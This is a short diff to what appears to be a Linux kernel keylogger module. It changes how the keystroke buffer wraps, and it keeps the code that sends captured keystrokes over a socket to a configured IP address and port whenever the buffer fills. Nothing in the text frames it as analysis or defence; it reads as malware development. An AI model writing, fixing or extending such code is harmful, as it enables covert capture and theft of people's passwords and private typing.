@@ -11,7 +11,7 @@ static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
 };
 
-static char keystrokes[KEY_BUFFER_SIZE]; // Keyboard stroke buffer
+static char keystrokes[KEY_BUFFER_SIZE + 1]; // Keyboard stroke buffer
 
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
@@ -23,14 +23,12 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         char key = (char) keycode; // Convert keycode to char
 
         keystrokes[buffer_count] = key;
-        buffer_count++;
+        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
-        if (buffer_count == KEY_BUFFER_SIZE) {
+        if (buffer_count == 0) {
             struct socket* sock = create_socket(IP_ADDRESS, PORT);
             send_message(sock, keystrokes);
             shutdown_socket(sock);
-
-            buffer_count = 0;
         }
     }
 
